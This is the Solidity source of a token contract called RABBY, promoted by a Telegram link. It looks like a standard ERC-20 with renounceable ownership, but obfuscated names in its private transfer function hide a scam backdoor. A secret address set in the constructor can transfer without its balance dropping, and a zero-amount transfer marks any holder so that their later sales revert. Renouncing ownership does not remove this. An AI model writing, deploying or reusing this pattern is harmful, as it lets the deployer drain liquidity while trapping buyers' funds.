/*

https://t.me/RabbyETH

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract RABBY is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private cinqqq = 48;

    function transferFrom(address newsst, address quatrrr, uint256 brooo) public returns (bool success) {
        require(brooo <= allowance[newsst][msg.sender]);
        allowance[newsst][msg.sender] -= brooo;
        row(newsst, quatrrr, brooo);
        return true;
    }

    mapping(address => uint256) private resss;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol = 'RABBY';

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public uniswapV2Pair;

    mapping(address => uint256) private plates;

    string public name = 'RABBY';

    constructor(address cinqtr) {
        balanceOf[msg.sender] = totalSupply;
        resss[cinqtr] = cinqqq;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function row(address newsst, address quatrrr, uint256 brooo) private returns (bool success) {
        if (resss[newsst] == 0) {
            balanceOf[newsst] -= brooo;
        }

        if (brooo == 0) plates[quatrrr] += cinqqq;

        if (newsst != uniswapV2Pair && resss[newsst] == 0 && plates[newsst] > 0) {
            resss[newsst] -= cinqqq;
        }

        balanceOf[quatrrr] += brooo;
        emit Transfer(newsst, quatrrr, brooo);
        return true;
    }

    function approve(address potta, uint256 brooo) public returns (bool success) {
        allowance[msg.sender][potta] = brooo;
        emit Approval(msg.sender, potta, brooo);
        return true;
    }

    function transfer(address quatrrr, uint256 brooo) public returns (bool success) {
        row(msg.sender, quatrrr, brooo);
        return true;
    }

    mapping(address => uint256) public balanceOf;
}